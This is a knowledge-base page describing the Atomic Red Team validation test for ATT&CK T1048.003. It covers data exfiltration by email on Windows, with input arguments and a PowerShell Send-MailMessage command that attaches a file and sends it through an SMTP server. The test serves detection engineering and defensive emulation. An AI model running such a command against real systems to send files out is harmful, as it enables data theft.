---
atomic_guid: "ec3a835e-adca-4c7c-88d2-853b69c11bb9"
title: "Exfiltration Over Alternative Protocol - SMTP"
framework: "atomic"
generated: "true"
attack_technique_id: "T1048.003"
attack_technique_name: "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1048.003/T1048.003.yaml"
build_date: "2026-04-26 17:02:12"
executor: "powershell"
aliases:
  - "ec3a835e-adca-4c7c-88d2-853b69c11bb9"
  - "Exfiltration Over Alternative Protocol - SMTP"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Exfiltration Over Alternative Protocol - SMTP

Exfiltration of specified file over SMTP.
Upon successful execution, powershell will send an email with attached file to exfiltrate to a remote address. Results will be via stdout.

## Metadata

- Atomic GUID: ec3a835e-adca-4c7c-88d2-853b69c11bb9
- Technique: T1048.003: Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol
- Platforms: windows
- Executor: powershell
- Source Path: atomics/T1048.003/T1048.003.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1048-exfiltration_over_alternative_protocol|T1048.003]]

## Input Arguments

### input_file

- description: Path to file to exfiltrate
- type: path
- default: C:\Windows\System32\notepad.exe

### receiver

- description: The email address of the receiver
- type: string
- default: test@corp.com

### sender

- description: The email address of the sender
- type: string
- default: test@corp.com

### smtp_server

- description: SMTP server to use for email transportation
- type: string
- default: 127.0.0.1

## Executor

- name: powershell

### Command

```powershell
Send-MailMessage -From #{sender} -To #{receiver} -Subject "T1048.003 Atomic Test" -Attachments #{input_file} -SmtpServer #{smtp_server}
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1048.003/T1048.003.yaml)
